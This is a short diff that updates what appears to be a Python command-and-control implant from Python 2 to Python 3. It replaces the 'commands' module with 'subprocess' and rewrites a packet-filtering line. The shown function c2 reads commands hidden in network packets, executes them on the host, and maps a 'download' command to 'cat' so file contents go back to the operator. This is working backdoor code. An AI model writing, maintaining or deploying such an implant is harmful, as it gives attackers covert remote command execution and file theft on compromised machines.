@@ -7,7 +7,7 @@ import os
 import sys
 import socket
 import string
-import commands
+import subprocess
 import re
 import base64
 import argparse
@@ -89,7 +89,7 @@ replyme(payload1)
 messageN = []
 
 def c2(packet):
-	filtered_string = ''.join(filter(lambda x:x in string.printable, str(packet[0])))
+	filtered_string = ''.join([x for x in str(packet[0]) if x in string.printable])
 	global messageN
 	global upfile
 	filtered_string = str(filtered_string).split('\x24') # Delimiting by $ as we need to take the header off
@@ -109,7 +109,7 @@ def c2(packet):
 			if cmd_string.split(' ')[0] == 'download':
 				cmd_string = 'cat ' + cmd_string.split(' ')[1]
 				upfile = 'upfile'
-			cmdout = commands.getstatusoutput(cmd_string) #Output is exit code + the output of command
+			cmdout = subprocess.getstatusoutput(cmd_string) #Output is exit code + the output of command
 			#Parses only for output of command and splits it by carriage return
 			cmdout = str(cmdout[1]).split('\n')
 			if upfile:
